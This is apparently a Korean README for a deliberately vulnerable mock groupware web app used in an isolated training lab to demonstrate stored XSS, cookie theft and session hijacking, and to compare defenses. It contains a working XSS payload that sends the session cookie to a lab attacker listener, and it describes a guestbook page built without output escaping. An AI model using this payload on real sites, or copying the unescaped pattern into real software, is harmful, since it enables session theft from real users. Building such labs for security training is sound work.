# 자체 취약 타겟 웹앱 — 사내 그룹웨어(모의)

DVWA를 대신(또는 함께) 쓸 수 있는, 직접 만든 취약 웹앱입니다. "사내 그룹웨어"
컨셉으로 **로그인(PHPSESSID 세션 생성)** 과 **방명록(Guestbook)의 저장형 XSS** 를
제공해, 이 랩의 **Stored XSS → 쿠키 유출 → 세션 하이재킹** 시나리오를 그대로 재현합니다.

> ⚠️ **교육용 격리 실습 전용.** 일부러 취약하게 만든 앱이므로 VMnet8 격리망
> (192.168.10.0/24) 밖으로 절대 노출하지 마십시오.

## 구성

| 파일 | 역할 |
| --- | --- |
| `login.php` / `logout.php` | 로그인 시 세션 생성(PHPSESSID 발급) = 탈취 대상 세션 |
| `index.php` | 로그인 후 대시보드 홈 |
| `guestbook.php` | **★ 저장형 XSS 취약점** — 입력값을 이스케이프 없이 출력 |
| `auth.php` | 로그인 가드 + 세션 하드닝(HttpOnly/SameSite) 토글 위치 |
| `db.php` / `config.php` / `schema.sql` | DB 연결·설정·스키마 |
| `header.php` / `footer.php` | 공통 레이아웃 |

## 설치

타겟 VM(.20)에서:

```bash
sudo bash scripts/03-setup-target-app.sh
```

- DB `groupware` / 계정 `groupware`·`p@ssw0rd` 생성, 스키마 적용
- `/var/www/html/groupware/` 로 배포
- 접속: `http://192.168.10.10/groupware/login.php` (게이트웨이 경유)
- 실습 계정: **admin / password**

## 공격 재현 (방어 OFF 베이스라인)

방명록 메시지에 아래 페이로드를 등록하면, 관리자가 방명록을 열 때 쿠키가
공격자 C2(`http.server 8000`)로 유출됩니다.

```html
<script>new Image().src='http://192.168.10.5:8000/log?c='+document.cookie</script>
```

## 방어 ON 비교 포인트

| 방어 | 적용 방법 |
| --- | --- |
| WAF(ModSecurity CRS 941xxx) | 게이트웨이에서 요청을 **403**으로 차단 |
| 세션 하드닝(HttpOnly/SameSite) | `auth.php`의 `session_set_cookie_params` 주석 해제 → `document.cookie`에 PHPSESSID가 안 잡힘 |
| 출력 이스케이프 | `guestbook.php`의 "안전한 버전" 주석으로 교체 → 저장형 XSS 자체가 무력화 |

이렇게 **같은 페이로드**로 OFF/ON을 번갈아 돌려 방어 효과를 정량 비교합니다.
(상세: [../docs/05-attack-verification.md](../docs/05-attack-verification.md))
